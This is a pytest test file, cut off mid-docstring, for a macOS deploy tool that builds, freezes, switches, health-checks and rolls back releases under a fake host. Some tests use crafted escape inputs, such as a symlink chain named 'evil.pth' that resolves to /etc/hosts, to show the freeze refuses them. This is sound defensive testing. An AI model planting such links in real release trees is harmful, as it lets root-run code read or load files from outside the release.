"""estia-deploy (deploy): a release built as the owner at its final path, frozen root-owned, switched atomically, health
checked, rolled back on failure, old releases pruned. A fake runner stands in for sudo, uv and launchd; git, tar and cp
run for real on a fake checkout in a temporary root."""

import ast
import contextlib
import json
import os
import pwd
import shutil
import signal
import sqlite3
import subprocess
import sys
import time
from collections.abc import Sequence
from pathlib import Path
from typing import Any

import pytest

from local_assistant import deploy, ownuser, voice
from local_assistant.deploy import ENV, Builder, Deploy, DeployError
from local_assistant.hostsec import CHOWN, LAUNCHCTL, SUDO, Host

ROOT = Path(__file__).resolve().parent.parent
UV = "/fake/bin/uv"
ME = pwd.getpwuid(os.getuid()).pw_name


def checkout(tmp_path: Path) -> Path:
    """A git repo laid out like ours, with one commit."""
    repo = tmp_path / "checkout"
    for name, text in {
        "src/local_assistant/__init__.py": "",
        "pyproject.toml": "[project]\nname = 'x'\n",
        "scripts/estia": "#!/bin/bash\necho estia\n",
        "scripts/estia-deploy": "#!/bin/bash\necho deploy\n",
        "src/local_assistant/hostsec.py": "# hostsec\n",
        "src/local_assistant/ownuser.py": "# ownuser\n",
        "src/local_assistant/deploy.py": "# deploy\n",
        "tools/tapo/pyproject.toml": "",
        "tools/ical/pyproject.toml": "",
        "tools/youtube/pyproject.toml": "",
        "tools/documents/Package.swift": "// swift-tools-version: 6.2\n",
        ".gitignore": ".build/\n",  # as ours: a build is never committed
        "tools/voice/Package.swift": "// swift-tools-version: 6.2\n",
        "tools/voice/Sources/voice-service/main.swift": "// the voice service\n",
        "tools/documents/check.pdf": (ROOT / "tools/documents/check.pdf").read_text(encoding="ascii"),
        "docs/brand/estia-avatar.png": "png",
    }.items():
        path = repo / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    (repo / "launchd").mkdir()
    for template in (ROOT / "launchd").glob("*.plist.in"):
        (repo / "launchd" / template.name).write_text(template.read_text())
    for argv in (
        ["git", "init", "-q"],
        ["git", "add", "-A"],
        ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", "commit", "-qm", "x"],
    ):
        subprocess.run(argv, cwd=repo, check=True)
    voice = repo / "tools/voice/.build/release"  # the owner's own build, never taken into a release
    (voice / "FluidAudio_FluidAudio.bundle").mkdir(parents=True)
    (voice / "voice-service").write_text("binary")
    (voice / "FluidAudio_FluidAudio.bundle" / "Info.plist").write_text("x")
    return repo


CHECKED = {"ok": True, "pages": [{"n": 1, "text": deploy.DOCUMENTS_CHECK_TEXT, "ocr": False}], "skipped": []}


class FakeMac(Host):
    """Runs git, tar, rm, mkdir and cp for real (after taking off the sudo/env prefix); fakes uv, the release's
    Pythons, swift (a build leaves its binary behind SwiftPM's `release` link) and the documents helper's answer,
    launchd, ps and the database read; records every argv. A build step takes 30 s of the clock; a restart starts a
    new bridge process, which writes last_alive when it is healthy."""

    def __init__(
        self,
        root: Path,
        *,
        healthy: bool = True,
        clock: "Clock | None" = None,
        restarts: bool = True,
        fails: str = "",
        loaded: set[str] | None = None,
    ) -> None:
        super().__init__(root, say=lambda text: None)
        self.asked: list[tuple[str, ...]] = []
        self.healthy = healthy
        self.alive = 0.0
        self.clock = clock
        self.pid = 4242
        self.restarts = restarts  # whether launchd really starts a new bridge process
        self.fails = fails  # a tool name whose command fails, with a message on stderr
        self.loaded = loaded  # the services launchd knows (None: every one); a bootstrap loads one
        self.built: list[str] = []  # the products swift built
        # where the voice service's build puts heart's file in its own bundle: "deep" (Contents/Resources, Swift 6.4's
        # default build, swiftbuild), "flat" (the bundle's top, the native build, Swift 6.2's default), "none" (not
        # there) or "other" (other bytes than the commit's); `left_out`: heart's files the build leaves out all the same
        self.heart = "deep"
        self.left_out: set[str] = set()
        self.fetched: list[str] = []  # the voice services that fetched Pocket TTS's program beside themselves
        self.python = "3.13.9"  # the Python uv installs into a release
        self.imports = (0, "")  # the new root-run tools' import check
        # what the release's documents helper says when it reads its check page
        self.documents_answer = (0, json.dumps({**CHECKED, "page_count": 1}) + "\n")

    def run(self, argv: Sequence[str], **kwargs: object) -> tuple[int, str]:
        argv = tuple(argv)
        self.asked.append(argv)
        inner = list(argv)
        if inner[0] == SUDO:
            inner = inner[inner.index("--") + 1 :]
        if inner and inner[0] == ENV:
            inner = inner[2:]
            while inner and "=" in inner[0] and not inner[0].startswith("/"):
                inner = inner[1:]
        tool = inner[0]
        if self.fails and Path(tool).name == self.fails:
            return 2, "line 1\nline 2\nerror: failed to fetch https://example.com/simple (network unreachable)\n"
        if self.clock is not None and tool == UV:
            self.clock.now += 30
        if tool == LAUNCHCTL and inner[1] in ("kickstart", "bootstrap") and self.restarts:
            self.pid += 1
            if self.healthy and self.clock is not None:
                self.alive = self.clock.now + 1  # the new bridge writes its sign of life
        if tool in ("/usr/bin/git", "/usr/bin/tar", "/bin/rm", "/bin/mkdir", "/bin/cp") or inner[:2] == [
            "/bin/bash",
            "-n",
        ]:
            done = subprocess.run(inner, capture_output=True, text=True, check=False)
            return done.returncode, done.stdout + done.stderr
        if tool == UV and inner[1:3] == ["python", "install"]:
            series = ".".join(self.python.split(".")[:2])
            interp = Path(inner[inner.index("--install-dir") + 1]) / (
                f"cpython-{self.python}-macos-aarch64-none/bin/python{series}"
            )
            interp.parent.mkdir(parents=True)
            interp.write_text("#!/bin/sh\n")
            return 0, ""
        if tool == UV and "sync" in inner:
            project = Path(inner[inner.index("--directory") + 1])
            venv = project / ".venv" / "bin"
            venv.mkdir(parents=True)
            (venv / "python").symlink_to(inner[inner.index("--python") + 1])
            (project / ".venv" / "pyvenv.cfg").write_text(f"home = {Path(inner[inner.index('--python') + 1]).parent}\n")
            return 0, ""
        if tool == deploy.SWIFT and inner[1] == "build":
            scratch = Path(inner[inner.index("--scratch-path") + 1])
            product = inner[inner.index("--product") + 1]
            products = scratch / "out" / "Products" / "Release"
            products.mkdir(parents=True)
            if product == "voice-service":  # its bytes follow the sources it was built from
                source = Path(inner[inner.index("--package-path") + 1]) / "Sources/voice-service/main.swift"
                (products / product).write_text(f"#!/bin/sh\n# built from: {source.read_text()}")
                (products / "FluidAudio_FluidAudio.bundle").mkdir()
                (products / "FluidAudio_FluidAudio.bundle" / "Info.plist").write_text("built")
                # its own bundle: heart's voice files as the commit has them (Package.swift's resources: the 100M's,
                # 27 Oct; the 18M's, 29 Oct); a commit without the 100M's still gets one, without the 18M's none
                voices = Path(inner[inner.index("--package-path") + 1]) / "Sources/voice-service/Voices"
                bundle = products / "voice-service_voice-service.bundle"
                resources = bundle / "Contents" / "Resources" if self.heart != "flat" else bundle
                resources.mkdir(parents=True)
                for name in deploy.HEART_FILES:
                    heart = voices / name
                    if self.heart == "none" or name in self.left_out:
                        continue
                    if not heart.is_file() and name != "heart.safetensors":
                        continue
                    built = heart.read_bytes() if heart.is_file() else b"heart"
                    (resources / name).write_bytes(built + (b" other" if self.heart == "other" else b""))
            else:
                (products / product).write_text("#!/bin/sh\n")
            (products / product).chmod(0o755)
            (products / "Core.o").write_text("object")
            (scratch / "release").symlink_to("out/Products/Release")
            self.built.append(product)
            return 0, "Build complete!\n"
        if tool.endswith("/documents-helper"):
            return self.documents_answer
        if tool.endswith("/voice-service") and inner[1:] == ["--fetch-pocket"]:  # the pinned program, beside it
            self.fetched.append(tool)
            folder = Path(tool).parent / "pocket-tts"
            folder.mkdir()
            (folder / "pocket-tts").write_text(f"pocket {len(self.fetched)}")
            (folder / "pocket-tts").chmod(0o755)
            (folder / "LICENSE").write_text("MIT")
            return 0, "voice-service: Pocket TTS: its program fetched and checked\n"

        if tool.endswith("/python3") and "local_assistant.deploy" in " ".join(inner):
            return self.imports
        if tool.endswith(("/python", "/python3.13")):
            if "--read-alive" in inner:
                return (0, f"{self.alive:.0f}\n") if self.healthy else (1, "")
            if "sys.prefix" in " ".join(inner):
                return 0, str(Path(tool).parents[1]) + "\n"
            return 0, ""
        if tool == LAUNCHCTL and inner[1] == "bootstrap" and self.loaded is not None:
            self.loaded.add(Path(inner[-1]).stem)
        if tool == LAUNCHCTL and inner[1] == "bootout" and self.loaded is not None:
            self.loaded.discard(inner[-1].removeprefix("system/"))
        if tool == LAUNCHCTL and inner[1] == "print":
            if self.loaded is not None and inner[-1].removeprefix("system/") not in self.loaded:
                return 113, f'Could not find service "{inner[-1]}" in domain for system\n'
            return 0, f"\tstate = running\n\tpid = {self.pid}\n"
        if tool == "/bin/ps":
            return 0, f"  {os.getuid()} /x/signal-cli --trust-new-identities on-first-use -a +306900000000 jsonRpc\n"
        return 0, ""


class Clock:
    def __init__(self, start: float = 1_791_000_000.0) -> None:
        self.now = start

    def __call__(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def her_uid(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ownuser, "lookup_uid", lambda name: os.getuid())


def deployment(
    root: Path,
    repo: Path,
    mac: FakeMac,
    clock: Clock,
    *,
    as_root: bool = True,
    keep: int = 3,
    health: bool = True,
    said: list[str] | None = None,
    confirm: bool = True,
    brew: Path | None = None,
    voice: bool = False,
) -> Deploy:
    builder = Builder(ME, root.parent / "owner-home", os.getuid())
    mac.clock = clock
    return Deploy(
        mac,
        builder,
        repo,
        uv=UV,
        keep=keep,
        voice=voice,
        clock=clock,
        sleep=clock.sleep,
        as_root=as_root,
        check_health=health,
        say=said.append if said is not None else lambda text: None,
        confirm=lambda question: confirm,
        brew=brew or root.parent / "no-homebrew",
    )


def daemons(root: Path) -> None:
    folder = root / "Library/LaunchDaemons"
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "com.local-assistant.bridge.plist").write_text("x")


def bring_alive(mac: FakeMac, clock: Clock) -> None:
    mac.clock = clock  # the bridge writes last_alive after its restart (FakeMac does, on kickstart)


def test_a_deploy_builds_as_the_owner_freezes_and_switches(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    (root / "Library/LaunchDaemons/com.local-assistant.voice.plist").write_text("x")
    mac = FakeMac(root)
    bring_alive(mac, clock)
    assert deployment(root, repo, mac, clock).run() == 0
    code = root / "usr/local/estia"
    current = code / "current"
    assert current.is_symlink() and os.readlink(current).startswith("releases/")
    release = current.resolve()
    assert (release / "src/local_assistant/__init__.py").is_file() and (
        release / "docs/brand/estia-avatar.png"
    ).is_file()
    assert (release / "tools/voice/.build/release/voice-service").read_text().startswith("#!/bin/sh\n# built from")
    assert (release / "tools/voice/.build/release/FluidAudio_FluidAudio.bundle/Info.plist").read_text() == "built"
    assert (release / ".venv/bin/python").is_symlink() and (release / "tools/tapo/.venv").is_dir()
    youtube = release / "tools/youtube/.venv/bin/python"  # the YouTube helper: built, and checked that it imports
    assert youtube.is_symlink() and any(
        argv[-4:] == (str(youtube), "-I", "-c", "import youtube_transcript_api, requests") for argv in mac.asked
    )
    assert os.readlink(release / ".venv/bin/python").startswith(str(release / "python"))  # its own interpreter
    meta = json.loads((release / "release.json").read_text())
    assert meta["sha"] == release.name.rsplit("-", 1)[1] and meta["source"] == str(repo) and meta["voice"] is True
    assert (code / "bin/estia").read_text() == "#!/bin/bash\necho estia\n" and os.access(code / "bin/estia", os.X_OK)
    assert not list((code / "releases").glob(".*"))  # no staging left
    for path in release.rglob("*"):
        if not path.is_symlink():
            assert not path.stat().st_mode & 0o022, path  # nobody but the owner (root) may change it
    built = [argv for argv in mac.asked if argv[:2] == (SUDO, "-u")]
    assert built and all(argv[:5] == (SUDO, "-u", ME, "-H", "--") and argv[5:7] == (ENV, "-i") for argv in built)
    root_run = [argv for argv in mac.asked if argv[:2] != (SUDO, "-u")]
    for argv in root_run:  # root never runs anything from the checkout or the build
        assert not argv[0].startswith(str(repo)) and not argv[0].startswith(str(code / "releases"))
    assert any(argv[0] == CHOWN and "root:wheel" in argv for argv in root_run)
    # the installed service file ("x") was not what the tools render: written, then loaded again
    assert (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.bridge.plist") in mac.asked


def test_the_build_runs_without_sudo_for_a_rehearsal(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, as_root=False, health=False).run() == 0
    assert not any(argv[0] == SUDO for argv in mac.asked)
    assert (root / "usr/local/estia/current/src/local_assistant").is_dir()


def test_a_failed_health_check_switches_back(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    good = FakeMac(root)
    bring_alive(good, clock)
    assert deployment(root, repo, good, clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    clock.now += 3600
    bad = FakeMac(root, healthy=False)
    said: list[str] = []
    second = deployment(root, repo, bad, clock)
    second.say = said.append
    assert second.run() == 1
    assert (root / "usr/local/estia/current").resolve() == first
    kicks = [argv for argv in bad.asked if argv[:2] == (LAUNCHCTL, "kickstart")]
    assert len(kicks) == 2  # the new release, then the old one again
    assert any("switched back" in line for line in said)


def test_a_check_window_ignores_a_dropped_connection(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Over SSH a dropped connection sends a hang-up: from the switch to the end of the check (and the switch back)
    it is ignored, so an unchecked release never stays live and a bootout is always followed by its bootstrap
    (review I30)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    clock.now += 3600
    seen: dict[str, list[object]] = {"go": [], "health": [], "switch": []}
    real_go, real_health, real_switch = Deploy.go, Deploy.health, Deploy.switch

    def watched(name: str, real: Any) -> Any:
        def call(self: Deploy, *args: Any) -> Any:
            seen[name].append((signal.getsignal(signal.SIGHUP), signal.getsignal(signal.SIGINT)))
            return real(self, *args)

        return call

    monkeypatch.setattr(Deploy, "go", watched("go", real_go))
    monkeypatch.setattr(Deploy, "health", watched("health", real_health))
    monkeypatch.setattr(Deploy, "switch", watched("switch", real_switch))
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root, healthy=False), clock, said=said).run() == 1
    ignored = (signal.SIG_IGN, signal.SIG_IGN)
    assert seen["go"] == [ignored] and seen["health"] == [ignored] and seen["switch"] == [ignored, ignored]
    assert signal.getsignal(signal.SIGHUP) is not signal.SIG_IGN  # given back after
    assert any("a dropped connection or a Ctrl-C waits for it" in line for line in said), said


def test_a_hang_up_while_the_release_builds_leaves_nothing(tmp_path: Path) -> None:
    """A hang-up during the minutes the build takes: the half-built release is removed, `current` stays, and the
    line says so (review I30)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    clock.now += 3600

    def unhandled(signum: int, _frame: object) -> None:  # the default would end the test run itself
        raise AssertionError("the hang-up was not handled")

    previous = signal.signal(signal.SIGHUP, unhandled)
    try:

        class HungUp(FakeMac):
            def run(self, argv: Sequence[str], **kwargs: object) -> tuple[int, str]:
                if UV in argv and "sync" in argv:
                    os.kill(os.getpid(), signal.SIGHUP)
                    time.sleep(0.5)
                return super().run(argv, **kwargs)

        said: list[str] = []
        assert deployment(root, repo, HungUp(root), clock, said=said).run() == 1
    finally:
        signal.signal(signal.SIGHUP, previous)
    assert (root / "usr/local/estia/current").resolve() == first
    assert sorted(p.name for p in (root / "usr/local/estia/releases").iterdir()) == [first.name]
    assert any(line.startswith("✗ deploy stopped, nothing switched") for line in said), said


def test_old_releases_are_pruned(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    for _ in range(5):
        clock.now += 60
        assert deployment(root, repo, FakeMac(root), clock, keep=3, health=False).run() == 0
    releases = sorted(p.name for p in (root / "usr/local/estia/releases").iterdir())
    assert len(releases) == 3 and (root / "usr/local/estia/current").resolve().name == releases[-1]


def test_the_freeze_refuses_links_out_of_the_release(tmp_path: Path) -> None:
    staging = tmp_path / "rel"
    (staging / "src").mkdir(parents=True)
    (staging / "src" / "ok.py").write_text("x")
    (staging / "src" / "inside").symlink_to("ok.py")
    deploy.verify_build(staging, os.getuid())
    (staging / "src" / "out").symlink_to("/etc/hosts")
    with pytest.raises(DeployError, match="out"):
        deploy.verify_build(staging, os.getuid())
    (staging / "src" / "out").unlink()
    os.link(staging / "src" / "ok.py", staging / "src" / "hard.py")
    with pytest.raises(DeployError, match="link"):
        deploy.verify_build(staging, os.getuid())
    (staging / "src" / "hard.py").unlink()
    (staging / "src" / "ok.py").chmod(0o4755)
    with pytest.raises(DeployError, match="set-id"):
        deploy.verify_build(staging, os.getuid())
    (staging / "src" / "ok.py").chmod(0o644)
    with pytest.raises(DeployError, match="owner"):
        deploy.verify_build(staging, os.getuid() + 1)


def test_a_dry_run_writes_nothing(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    host = Host(root, dry_run=True)
    builder = Builder(ME, Path.home(), os.getuid())
    run = Deploy(
        host,
        builder,
        repo,
        uv=UV,
        clock=clock,
        sleep=clock.sleep,
        as_root=True,
        check_health=False,
        brew=tmp_path / "no-homebrew",
    )
    assert run.run() == 0
    assert not root.exists()
    out = capsys.readouterr().out
    assert "would run: /usr/bin/sudo -u" in out and "uv python install 3.13" in out and "would switch" in out


def test_no_checkout_and_no_release_is_an_error(tmp_path: Path) -> None:
    with pytest.raises(DeployError, match="checkout"):
        deploy.default_checkout(tmp_path / "usr/local/estia")


def test_the_default_checkout_is_the_current_release_source(tmp_path: Path) -> None:
    code = tmp_path / "usr/local/estia"
    (code / "releases/r1").mkdir(parents=True)
    (code / "releases/r1/release.json").write_text(json.dumps({"source": "/somewhere/estia"}))
    (code / "current").symlink_to("releases/r1")
    assert deploy.default_checkout(code) == Path("/somewhere/estia")


def test_a_relative_checkout_is_kept_as_its_absolute_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """`estia-deploy .` records the checkout's absolute path: a later deploy from another folder finds it."""
    repo = checkout(tmp_path)
    seen: list[Path] = []

    def run(self: Deploy, **_kwargs: object) -> int:
        seen.append(self.checkout)
        return 0

    monkeypatch.setattr(Deploy, "run", run)
    monkeypatch.chdir(repo)
    assert deploy.main([".", "--dry-run"]) == 0
    assert seen == [repo.resolve()]


def test_last_alive_is_read_read_only(tmp_path: Path) -> None:
    db = tmp_path / "assistant.db"
    with sqlite3.connect(db) as conn:
        conn.execute("CREATE TABLE state (key TEXT PRIMARY KEY, value TEXT)")
        conn.execute("INSERT INTO state VALUES ('last_alive', '1791000123')")
    assert deploy.read_alive(db) == "1791000123"
    assert deploy.read_alive(tmp_path / "none.db") is None
    assert sorted(p.name for p in tmp_path.iterdir()) == ["assistant.db"]  # no -wal or -shm made


def test_the_release_side_of_the_health_check_never_changes(tmp_path: Path) -> None:
    """Older root-run tools drive a newer release until --update-tools (the update order: deploy, --update-tools,
    deploy): the first deploy of every update calls the new release's `deploy --read-alive DB` and `--read-calls
    CONFIG` and reads their output. Their flags and output stay as they are, or every update fails its health check
    and switches back (review I17)."""
    db = tmp_path / "assistant.db"
    with sqlite3.connect(db) as conn:
        conn.execute("CREATE TABLE state (key TEXT PRIMARY KEY, value TEXT)")
        conn.execute("INSERT INTO state VALUES ('last_alive', '1791000123')")
    config = tmp_path / "config.toml"
    config.write_text("[voice]\n[calls]\n", encoding="utf-8")

    def cli(*args: str) -> tuple[int, str]:
        done = subprocess.run(
            [sys.executable, "-I", "-m", "local_assistant.deploy", *args], capture_output=True, text=True, check=False
        )
        return done.returncode, done.stdout

    assert cli("--read-alive", str(db)) == (0, "1791000123\n")
    assert cli("--read-alive", str(tmp_path / "none.db")) == (1, "\n")
    assert cli("--read-calls", str(config)) == (0, "on\n")
    assert cli("--read-calls", str(tmp_path / "none.toml")) == (0, "off\n")
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    mac = FakeMac(root)
    run = deployment(root, repo, mac, clock)
    assert run.run() == 0 and run.her_calls() is False
    her = (SUDO, "-n", "-u", "_estia", "-H", "--", ENV, "-i", "HOME=/var/estia")
    python = str(root / "usr/local/estia/current/.venv/bin/python")
    db_path = "/var/estia/Library/Application Support/local-assistant/assistant.db"
    assert (*her, python, "-I", "-m", "local_assistant.deploy", "--read-alive", db_path) in mac.asked
    config_path = "/var/estia/.config/local-assistant/config.toml"
    assert (*her, python, "-I", "-m", "local_assistant.deploy", "--read-calls", config_path) in mac.asked


def test_the_owner_is_the_sudo_user(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    monkeypatch.delenv("SUDO_USER", raising=False)
    with pytest.raises(DeployError, match="sudo"):
        deploy.builder()
    monkeypatch.setenv("SUDO_USER", ME)
    assert deploy.builder().name == ME


# ------------------------------------------------------------------ the review's fixes


def commit(repo: Path, name: str, text: str, message: str) -> None:
    (repo / name).parent.mkdir(parents=True, exist_ok=True)
    (repo / name).write_text(text)
    for argv in (
        ["git", "add", "-A"],
        ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", "commit", "-qm", message],
    ):
        subprocess.run(argv, cwd=repo, check=True)


def test_the_health_check_needs_a_new_bridge_process(tmp_path: Path) -> None:
    """The old bridge keeps writing last_alive during the build: only a new process, alive after the restart, counts."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    first = (root / "usr/local/estia/current").resolve()
    clock.now += 3600
    stuck = FakeMac(root, restarts=False)  # launchd never started a new bridge: the old pid stays
    stuck.alive = clock.now + 10_000  # and the old one keeps writing its sign of life
    said: list[str] = []
    assert deployment(root, repo, stuck, clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == first
    assert any("did not restart" in line for line in said)


def test_last_alive_from_before_the_restart_does_not_count(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    daemons(root)
    mac = FakeMac(root, healthy=False)  # a new process, which never writes last_alive
    mac.alive = clock.now + 60  # written by the old bridge while the release was built
    said: list[str] = []
    assert deployment(root, repo, mac, clock, said=said).run() == 1
    assert any("last_alive" in line for line in said)


def test_the_freeze_refuses_a_chain_of_links_out_of_the_release(tmp_path: Path) -> None:
    """Each link's text stays inside, but the kernel resolves .. after the links before it: /etc/hosts."""
    staging = tmp_path / "rel"
    (staging / "sub").mkdir(parents=True)
    (staging / "sub" / "b").symlink_to("..")
    (staging / "b").symlink_to(".")
    (staging / "sub" / "evil.pth").symlink_to("b/b/b/b/../../../../../etc/hosts")
    with pytest.raises(DeployError, match=r"evil\.pth"):
        deploy.verify_build(staging, os.getuid())


def test_the_freeze_refuses_a_dangling_link(tmp_path: Path) -> None:
    staging = tmp_path / "rel"
    staging.mkdir()
    (staging / "gone").symlink_to("nowhere.py")
    with pytest.raises(DeployError, match="gone"):
        deploy.verify_build(staging, os.getuid())


def test_a_file_swapped_for_a_fifo_is_refused_without_hanging(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Between the check and the open, a regular file can become a FIFO: the open must not wait for a writer."""
    import signal

    staging = tmp_path / "rel"
    staging.mkdir()
    os.mkfifo(staging / "pipe")
    real_stat = os.stat

    def looks_regular(path: object, *args: object, **kwargs: object) -> os.stat_result:
        found = real_stat(path, *args, **kwargs)  # type: ignore[arg-type]
        if str(path) == "pipe":
            return os.stat_result((0o100644, *tuple(found)[1:]))
        return found

    def hung(signum: int, frame: object) -> None:
        raise TimeoutError("the open waited for a writer")

    monkeypatch.setattr(os, "stat", looks_regular)
    before = signal.signal(signal.SIGALRM, hung)
    signal.alarm(3)
    try:
        with pytest.raises(DeployError, match="pipe"):
            deploy.verify_build(staging, os.getuid())
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, before)


def test_the_release_keeps_bytecode_valid_after_the_freeze(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False).run() == 0
    syncs = [argv for argv in mac.asked if "sync" in argv]
    assert len(syncs) == 4 and all("UV_COMPILE_BYTECODE=1" in argv for argv in syncs)
    assert any("compileall" in argv for argv in mac.asked)
    release = (root / "usr/local/estia/current").resolve()
    source = repo / "src/local_assistant/__init__.py"
    frozen = release / "src/local_assistant/__init__.py"
    assert frozen.stat().st_mtime_ns == source.stat().st_mtime_ns or frozen.stat().st_mtime == pytest.approx(
        source.stat().st_mtime, abs=1
    )  # git archive's times, kept by the freeze: a .pyc stays valid


def homebrew(tmp_path: Path) -> Path:
    """Homebrew's signal-cli (a link into its keg) and openjdk, as on the Mac."""
    brew = tmp_path / "homebrew"
    keg = brew / "Cellar/signal-cli/0.14.9"
    (keg / "bin").mkdir(parents=True)
    (keg / "bin/signal-cli").write_text("native")
    (keg / "bin/signal-cli").chmod(0o755)
    (brew / "bin").mkdir()
    (brew / "bin/signal-cli").symlink_to("../Cellar/signal-cli/0.14.9/bin/signal-cli")
    java = brew / "opt/openjdk/libexec/openjdk.jdk/Contents/Home/bin/java"
    java.parent.mkdir(parents=True)
    java.write_text("java")
    java.chmod(0o755)
    return brew


def jvm_vendor(repo: Path, *, jdk: bool = True) -> None:
    """The JVM signal-cli in the checkout's vendor/, with a JDK next to it (`jdk`)."""
    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
    launcher.parent.mkdir(parents=True)
    launcher.write_text("#!/bin/sh\n")
    if jdk:
        java = repo / "vendor/openjdk.jdk/Contents/Home/bin/java"
        java.parent.mkdir(parents=True)
        java.write_text("java")
        java.chmod(0o755)


def test_her_signal_cli_and_java_are_copied_into_the_release(tmp_path: Path) -> None:
    """Homebrew's folders are yours: what she runs is copied into the root-owned release."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False, brew=homebrew(tmp_path)).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert (release / "vendor/signal-cli-native/bin/signal-cli").read_text() == "native"
    assert (release / "vendor/openjdk.jdk/Contents/Home/bin/java").read_text() == "java"
    assert (release / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli").is_file()
    meta = json.loads((release / "release.json").read_text())
    assert {"signal-cli-native", "openjdk.jdk", "signal-cli-0.14.9-jvm"} <= set(meta["vendor"])


def older_jvm(repo: Path, version: str = "0.14.8") -> None:
    """A second, older JVM signal-cli beside jvm_vendor's 0.14.9 (an update before kept it in vendor/)."""
    launcher = repo / f"vendor/signal-cli-{version}-jvm/signal-cli-{version}/bin/signal-cli"
    launcher.parent.mkdir(parents=True)
    launcher.write_text("#!/bin/sh\n")


def test_a_deploy_copies_only_the_java_build_she_runs_and_names_the_ones_left_out(tmp_path: Path) -> None:
    """Second deep scan, signal-07: every deploy carried every older Java signal-cli forward (about 120 MB each, in
    every release kept). Only the one she runs goes into the release: the newest (`config.jvm_signal_cli`), and the
    one her config's [calls] signal_cli names, read as her; the review names each one left out."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    older_jvm(repo)
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert (release / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli").is_file()
    assert not (release / "vendor/signal-cli-0.14.8-jvm").exists()
    assert "signal-cli-0.14.8-jvm" not in json.loads((release / "release.json").read_text())["vendor"]
    shown = "\n".join(said)
    assert "left out: vendor/signal-cli-0.14.8-jvm/signal-cli-0.14.8 (an older Java build" in shown, shown
    clock.now += 60
    named = deployment(root, repo, FakeMac(root), clock, health=False)
    named.her_call_build = lambda: "signal-cli-0.14.8-jvm/signal-cli-0.14.8"  # her config names it: kept
    assert named.run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert (release / "vendor/signal-cli-0.14.8-jvm/signal-cli-0.14.8/bin/signal-cli").is_file()
    assert (release / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli").is_file()
    clock.now += 60
    unread = deployment(root, repo, FakeMac(root), clock, health=False)
    unread.her_call_build = lambda: None  # her config not read: every build stays, as before
    assert unread.run() == 0
    assert ((root / "usr/local/estia/current").resolve() / "vendor/signal-cli-0.14.8-jvm").is_dir()


def test_an_older_java_build_in_the_live_release_is_not_carried_forward(tmp_path: Path) -> None:
    """signal-07: the live release's vendor/ is one of the places a deploy takes her programs from; an older Java build
    there stays behind once a newer one comes, and the review says it goes."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    older_jvm(repo)
    java = repo / "vendor/openjdk.jdk/Contents/Home/bin/java"
    java.parent.mkdir(parents=True)
    java.write_text("java")
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    shutil.rmtree(repo / "vendor/signal-cli-0.14.8-jvm")  # the checkout's vendor/ moved on
    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
    launcher.parent.mkdir(parents=True)
    launcher.write_text("#!/bin/sh\n")
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not (release / "vendor/signal-cli-0.14.8-jvm").exists()
    assert "left out: vendor/signal-cli-0.14.8-jvm/signal-cli-0.14.8" in "\n".join(said), said


def test_the_call_helpers_stamp_goes_with_it_into_her_release(tmp_path: Path) -> None:
    """signal-06: setup and doctor read the stamp build.sh writes beside the call helper (its sources), in her release
